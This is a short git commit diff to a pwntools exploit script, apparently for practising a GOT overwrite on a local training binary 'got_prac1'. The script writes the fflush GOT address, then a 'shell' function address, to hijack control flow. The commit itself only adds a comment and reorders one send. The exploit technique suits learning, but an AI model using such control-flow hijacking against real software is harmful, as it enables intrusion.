81479e16ce29e48fb3f2aaef74349b2e0172dc1a
synod2 <synod2@naver.com>
2020-09-28 08:17:04 +0000

    check point

--- gottest/ex.py
+++ gottest/ex.py
@@ -2,12 +2,13 @@ from pwn import *
 
 p = process("./got_prac1")
 
-addr = 0x080499bc
+addr = 0x080499bc   #fflush_got
 shell = 0x08048546
 
-p.sendline(p32(addr))
 
 pause()
+
+p.sendline(p32(addr))
 
 p.sendline(p32(shell))
 
